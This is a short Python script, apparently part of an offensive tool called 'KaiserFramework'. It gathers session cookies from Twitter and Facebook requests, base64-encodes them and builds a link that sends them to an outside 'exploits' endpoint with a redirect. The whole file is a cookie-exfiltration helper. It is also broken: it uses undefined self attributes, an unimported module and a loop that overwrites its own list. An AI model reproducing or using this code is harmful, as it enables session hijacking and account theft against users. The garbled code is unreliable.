import requests
import base64
import json

#redirect url
redirectUrl = "https://twitter.com/KaiserFramework"

#init sesh
s = requests.session()

#obtain cookies
s.get("https://twitter.com/KaiserFramework")
s.get("https://facebook.com")

cookieStr = ""
cookies = [
{'name': c.name, 'value': c.value, 'domain': c.domain, 'path': c.path, 'url': ''} for c in self.session.cookies]
for cookie in cookies:
	if cookie['domain'][0] == ".":
	      cookie['url'] = cookie['domain'][1:]
	else:
		cookie['url'] = cookie['domain']
		cookie['url'] = "https://"+cookie['url']
	cookies = json.dumps(cookies)
	cookieStr = urllib.parse.quote(base64.b64encode(bytes(cookies, 'utf-8')).decode())
	if not cookieStr: return
	url = urllib.parse.quote(base64.b64encode(bytes(self.securecode.url, 'utf-8')).decode())
	expToken = f"https://api.kaiserframework.com/exploits/?cookie={cookieStr}&redirect={url}"

print(expToken)
